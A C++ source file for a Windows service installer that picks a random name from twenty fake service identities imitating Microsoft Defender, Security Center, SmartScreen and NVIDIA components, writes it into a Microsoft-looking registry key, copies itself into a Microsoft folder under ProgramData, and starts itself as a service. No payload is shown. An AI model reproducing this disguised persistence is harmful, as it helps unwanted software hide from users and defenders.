#include "ServiceInstaller.h"
#include <stdio.h>
#include <random>
#include <ctime>
#include <Shlobj.h>

#pragma comment(lib, "shell32.lib")

static const wchar_t* REGISTRY_PATH = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\DeviceSync";
static const wchar_t* REGISTRY_VALUE = L"SvcIdentifier";

struct ServiceIdentity
{
    const wchar_t* Name;
    const wchar_t* Description;
};

static const ServiceIdentity g_Services[] =
{
    { L"WinDefenderSync", L"Synchronizes Microsoft Defender Antivirus signatures with the cloud protection service." },
    { L"NvStreamMgr", L"Manages network streams for NVIDIA GameStream technology and remote play." },
    { L"SysHealthMonitor", L"Monitors system performance metrics and hardware health status." },
    { L"WindowsTelemetryHost", L"Hosts diagnostic and telemetry components for the Windows Customer Experience Improvement Program." },
    { L"RuntimeBrokerSvc", L"Manages permissions and runtime environments for Universal Windows Platform apps." },
    { L"SecurityHealthAgent", L"Reports the health status of local security software to the Windows Security Center." },
    { L"DiagServiceHost", L"Hosts diagnostic troubleshooting tools and resolves system network issues." },
    { L"DeviceAssociationSvc", L"Enables pairing and association between the system and wired or wireless devices." },
    { L"UserDataStorageSvc", L"Provides secure storage and access to sensitive user application data." },
    { L"AppXDeploySvc", L"Provides infrastructure for deploying, updating, and removing Windows Store applications." },
    { L"WinBioCredProv", L"Supports the capture, comparison, and storage of biometric data for user authentication." },
    { L"PerceptionSimSvc", L"Enables spatial perception and simulation for Windows Mixed Reality devices." },
    { L"GraphicsDevicePolicySvc", L"Manages graphics preferences and policies for displaying content on connected monitors." },
    { L"TokenBrokerCacheSvc", L"Caches authentication tokens for Microsoft account single sign-on." },
    { L"CapabilityAccessMgr", L"Brokers access to device capabilities like camera and microphone for installed applications." },
    { L"SmartScreenHost", L"Helps protect against malicious software and websites using Microsoft Defender SmartScreen." },
    { L"DataIntegritySvc", L"Verifies file system metadata and maintains volume integrity." },
    { L"SystemEventNotification", L"Tracks system events such as logon, logoff, and network connections for dependent services." },
    { L"PlatformDeviceSync", L"Synchronizes platform device settings such as Bluetooth and USB configurations." },
    { L"WlanAutoProxy", L"Provides an auto-proxy discovery service for wireless networks." }
};

static const int g_NumNames = _countof ( g_Services );

std::wstring GenerateServiceName ( )
{
    std::mt19937 rng ( static_cast< unsigned int >( time ( nullptr ) ^ GetCurrentProcessId ( ) ) );
    std::uniform_int_distribution< int > dist ( 0 , g_NumNames - 1 );
    return g_Services[dist ( rng )].Name;
}

std::wstring GetServiceDescription ( const std::wstring& name )
{
    for ( int i = 0; i < g_NumNames; ++i )
    {
        if ( name == g_Services[i].Name )
            return g_Services[i].Description;
    }
    return L"";
}

bool SaveServiceName ( const std::wstring& name )
{
    HKEY hKey = NULL;
    LONG result = RegCreateKeyExW ( HKEY_LOCAL_MACHINE , REGISTRY_PATH , 0 , NULL ,
        REG_OPTION_NON_VOLATILE , KEY_WRITE , NULL , &hKey , NULL );
    if ( result != ERROR_SUCCESS ) return false;

    result = RegSetValueExW ( hKey , REGISTRY_VALUE , 0 , REG_SZ ,
        reinterpret_cast< const BYTE* >( name.c_str ( ) ) ,
        static_cast< DWORD >( ( name.size ( ) + 1 ) * sizeof ( wchar_t ) ) );

    RegCloseKey ( hKey );
    return result == ERROR_SUCCESS;
}

std::wstring LoadServiceName ( )
{
    HKEY hKey = NULL;
    LONG result = RegOpenKeyExW ( HKEY_LOCAL_MACHINE , REGISTRY_PATH , 0 , KEY_READ , &hKey );
    if ( result != ERROR_SUCCESS ) return L"";

    wchar_t buffer[256] = { };
    DWORD size = sizeof ( buffer );
    DWORD type = 0;
    result = RegQueryValueExW ( hKey , REGISTRY_VALUE , NULL , &type ,
        reinterpret_cast< BYTE* >( buffer ) , &size );

    RegCloseKey ( hKey );

    if ( result == ERROR_SUCCESS && type == REG_SZ )
        return std::wstring ( buffer );

    return L"";
}

void ClearServiceName ( )
{
    RegDeleteKeyW ( HKEY_LOCAL_MACHINE , REGISTRY_PATH );
}

void InstallService(PCWSTR pszServiceName,
    PCWSTR pszDisplayName,
    PCWSTR pszDescription,
    DWORD dwStartType,
    PCWSTR pszDependencies,
    PCWSTR pszAccount,
    PCWSTR pszPassword)
{
    wchar_t szCurrentPath[MAX_PATH];
    wchar_t szTargetPath[MAX_PATH];
    SC_HANDLE schSCManager = NULL;
    SC_HANDLE schService = NULL;

    if (GetModuleFileNameW(NULL, szCurrentPath, ARRAYSIZE(szCurrentPath)) == 0)
    {
        wprintf(L"GetModuleFileName failed w/err 0x%08lx\n", GetLastError());
        goto Cleanup;
    }

    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, 0, szTargetPath)))
    {
        wcscat_s(szTargetPath, MAX_PATH, L"\\Microsoft\\DeviceSync");
        SHCreateDirectoryExW(NULL, szTargetPath, NULL);
        
        wcscat_s(szTargetPath, MAX_PATH, L"\\");
        wcscat_s(szTargetPath, MAX_PATH, pszServiceName);
        wcscat_s(szTargetPath, MAX_PATH, L".exe");
        
        if (!CopyFileW(szCurrentPath, szTargetPath, FALSE))
            wcscpy_s(szTargetPath, MAX_PATH, szCurrentPath);
    }
    else
    {
        wcscpy_s(szTargetPath, MAX_PATH, szCurrentPath);
    }

    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
    if (schSCManager == NULL)
    {
        wprintf(L"OpenSCManager failed w/err 0x%08lx\n", GetLastError());
        goto Cleanup;
    }

    schService = CreateService(
        schSCManager,
        pszServiceName,
        pszDisplayName,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        dwStartType,
        SERVICE_ERROR_NORMAL,
        szTargetPath,
        NULL,
        NULL,
        pszDependencies,
        pszAccount,
        pszPassword);

    if (schService == NULL)
    {
        wprintf(L"CreateService failed w/err 0x%08lx\n", GetLastError());
        goto Cleanup;
    }

    if (pszDescription != NULL)
    {
        SERVICE_DESCRIPTIONW sd;
        sd.lpDescription = const_cast<LPWSTR>(pszDescription);
        ChangeServiceConfig2W(schService, SERVICE_CONFIG_DESCRIPTION, &sd);
    }

    wprintf(L"%s is installed.\n", pszServiceName);

    if ( StartServiceW ( schService , 0 , NULL ) )
    {
        wprintf ( L"%s started successfully.\n" , pszServiceName );
    }
    else
    {
        DWORD err = GetLastError ( );
        if ( err == ERROR_SERVICE_ALREADY_RUNNING )
            wprintf ( L"%s is already running.\n" , pszServiceName );
        else
            wprintf ( L"StartService failed w/err 0x%08lx\n" , err );
    }

Cleanup:
    if (schSCManager)
    {
        CloseServiceHandle(schSCManager);
        schSCManager = NULL;
    }
    if (schService)
    {
        CloseServiceHandle(schService);
        schService = NULL;
    }
}

void UninstallService(PCWSTR pszServiceName)
{
    SC_HANDLE schSCManager = NULL;
    SC_HANDLE schService = NULL;
    SERVICE_STATUS ssSvcStatus = {};
    wchar_t szServicePath[MAX_PATH] = { 0 };

    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (schSCManager == NULL)
    {
        wprintf(L"OpenSCManager failed w/err 0x%08lx\n", GetLastError());
        goto Cleanup;
    }

    schService = OpenService(schSCManager, pszServiceName, SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE | SERVICE_QUERY_CONFIG);
    if (schService == NULL)
    {
        wprintf(L"OpenService failed w/err 0x%08lx\n", GetLastError());
        goto Cleanup;
    }

    DWORD dwBytesNeeded;
    QueryServiceConfigW(schService, NULL, 0, &dwBytesNeeded);
    if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
    {
        LPQUERY_SERVICE_CONFIGW pConfig = (LPQUERY_SERVICE_CONFIGW)LocalAlloc(LPTR, dwBytesNeeded);
        if (pConfig)
        {
            if (QueryServiceConfigW(schService, pConfig, dwBytesNeeded, &dwBytesNeeded))
            {
                std::wstring pathStr = pConfig->lpBinaryPathName;
                if (!pathStr.empty() && pathStr[0] == L'"')
                {
                    pathStr = pathStr.substr(1);
                    size_t quotePos = pathStr.find(L'"');
                    if (quotePos != std::wstring::npos)
                        pathStr = pathStr.substr(0, quotePos);
                }
                wcscpy_s(szServicePath, MAX_PATH, pathStr.c_str());
            }
            LocalFree(pConfig);
        }
    }

    if (ControlService(schService, SERVICE_CONTROL_STOP, &ssSvcStatus))
    {
        wprintf(L"Stopping %s.", pszServiceName);
        Sleep(1000);
        while (QueryServiceStatus(schService, &ssSvcStatus))
        {
            if (ssSvcStatus.dwCurrentState == SERVICE_STOP_PENDING)
            {
                wprintf(L".");
                Sleep(1000);
            }
            else break;
        }
        if (ssSvcStatus.dwCurrentState == SERVICE_STOPPED)
        {
            wprintf(L"\n%s is stopped.\n", pszServiceName);
        }
        else
        {
            wprintf(L"\n%s failed to stop.\n", pszServiceName);
        }
    }

    if (!DeleteService(schService))
    {
        wprintf(L"DeleteService failed w/err 0x%08lx\n", GetLastError());
        goto Cleanup;
    }

    wprintf(L"%s is removed.\n", pszServiceName);
    ClearServiceName ( );

    if (szServicePath[0] != L'\0')
    {
        Sleep(500); 
        if (!DeleteFileW(szServicePath))
        {
            MoveFileExW(szServicePath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
        }
    }

Cleanup:
    if (schSCManager)
    {
        CloseServiceHandle(schSCManager);
        schSCManager = NULL;
    }
    if (schService)
    {
        CloseServiceHandle(schService);
        schService = NULL;
    }
}
